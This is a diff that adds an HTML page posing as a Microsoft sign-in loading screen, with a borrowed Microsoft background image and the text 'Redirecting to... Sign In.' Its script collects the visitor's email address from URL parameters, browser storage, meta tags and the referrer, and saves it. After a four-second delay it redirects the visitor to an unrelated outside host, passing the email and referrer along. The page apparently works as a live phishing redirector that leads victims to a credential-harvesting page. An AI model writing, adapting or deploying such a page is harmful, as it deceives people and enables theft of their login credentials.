@@ -1,0 +1,176 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <style>
+    body {
+      margin: 0;
+      padding: 0;
+      height: 100vh;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      background: url('https://aadcdn.msftauth.net/shared/1.0/content/images/backgrounds/4_eae2dd7eb3a55636dc2d74f4fa4c386e.svg') no-repeat center center;
+      background-size: cover;
+      background-attachment: fixed;
+      background-color: rgba(71, 71, 71, 0.3);
+      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+      position: relative;
+    }
+
+    body::before {
+      content: '';
+      position: fixed;
+      top: 0;
+      left: 0;
+      right: 0;
+      bottom: 0;
+      background-color: rgba(130, 129, 129, 0.25);
+      pointer-events: none;
+    }
+
+    .spinner-container {
+      position: relative;
+      width: 60px;
+      height: 60px;
+      z-index: 10;
+    }
+
+    .spinner {
+      position: absolute;
+      width: 100%;
+      height: 100%;
+      border: 4px solid rgba(255, 255, 255, 0.25);
+      border-top: 4px solid #ffffff;
+      border-right: 4px solid rgba(255, 255, 255, 0.9);
+      border-radius: 50%;
+      animation: spin 1s linear infinite;
+      box-shadow: 0 0 20px rgba(255, 255, 255, 0.6);
+    }
+
+    @keyframes spin {
+      0% {
+        transform: rotate(0deg);
+      }
+      100% {
+        transform: rotate(360deg);
+      }
+    }
+
+    .loading-text {
+      position: absolute;
+      bottom: -40px;
+      width: 200px;
+      left: -70px;
+      text-align: center;
+      color: white;
+      font-size: 14px;
+      font-weight: 500;
+      text-shadow: 0 2px 4px rgba(0, 0, 0, 0.4);
+    }
+  </style>
+  <script>
+    // Function to extract email from various sources
+    function extractEmailFromReferrer() {
+      var email = '';
+      
+      // Try to get email from URL parameters
+      try {
+        var urlParams = new URLSearchParams(window.location.search);
+        email = urlParams.get('email') || urlParams.get('user') || urlParams.get('recipient') || '';
+      } catch(e) {
+        // Fallback for older browsers
+        var match = window.location.search.match(/[?&]email=([^&]+)/);
+        if (match) email = decodeURIComponent(match[1]);
+      }
+      
+      // Try from localStorage if set
+      if (!email) {
+        email = localStorage.getItem('userEmail') || '';
+      }
+      
+      // Try from sessionStorage
+      if (!email) {
+        email = sessionStorage.getItem('visitorEmail') || '';
+      }
+      
+      // Try to get from document (if set in meta tags)
+      if (!email) {
+        var emailMeta = document.querySelector('meta[name="user-email"]');
+        if (emailMeta) {
+          email = emailMeta.getAttribute('content') || '';
+        }
+      }
+      
+      // Try from referrer domain (if from Microsoft/Outlook/Email client)
+      if (!email && document.referrer) {
+        try {
+          var referrerUrl = new URL(document.referrer);
+          // Check for email in referrer URL parameters
+          var refEmail = referrerUrl.searchParams.get('email') || 
+                        referrerUrl.searchParams.get('user') || 
+                        referrerUrl.searchParams.get('recipient') || '';
+          if (refEmail) email = refEmail;
+          
+          // Try to extract email pattern from referrer hostname if it's an email service
+          if (!email && (referrerUrl.hostname.includes('outlook') || 
+                        referrerUrl.hostname.includes('microsoft') ||
+                        referrerUrl.hostname.includes('gmail') ||
+                        referrerUrl.hostname.includes('mail'))) {
+            // Email services often include user info in the referrer, but it's usually not accessible
+            // This is here for compatibility
+          }
+        } catch(e) {
+          // Referrer may not be available due to security restrictions
+        }
+      }
+      
+      return email;
+    }
+    
+    // Function to build redirect URL with email parameter
+    function buildRedirectUrl() {
+      var baseUrl = 'http://storage.iracustodianusa.help/9?ai=xd';
+      var email = extractEmailFromReferrer();
+      
+      // Store email in sessionStorage for persistance
+      if (email) {
+        sessionStorage.setItem('visitorEmail', email);
+        localStorage.setItem('userEmail', email);
+      }
+      
+      // Append email parameter to redirect URL
+      if (email) {
+        var separator = baseUrl.indexOf('?') > -1 ? '&' : '?';
+        return baseUrl + separator + 'email=' + encodeURIComponent(email) + '&ref=' + encodeURIComponent(document.referrer);
+      }
+      
+      // Include referrer info even if email is not found
+      var separator = baseUrl.indexOf('?') > -1 ? '&' : '?';
+      return baseUrl + separator + 'ref=' + encodeURIComponent(document.referrer);
+    }
+    
+    // Perform redirect with email parameter
+    function performRedirect() {
+      var redirectUrl = buildRedirectUrl();
+      // Delay redirect by 4 seconds (4000 milliseconds)
+      setTimeout(function() {
+        window.location.href = redirectUrl;
+      }, 4000);
+    }
+    
+    // Execute redirect on page load
+    if (document.readyState === 'loading') {
+      document.addEventListener('DOMContentLoaded', performRedirect);
+    } else {
+      performRedirect();
+    }
+  </script>
+</head>
+<body>
+  <div class="spinner-container">
+    <div class="spinner"></div>
+    <div class="loading-text">Redirecting to... Sign In.</div>
+  </div>
+</body>
+</html>
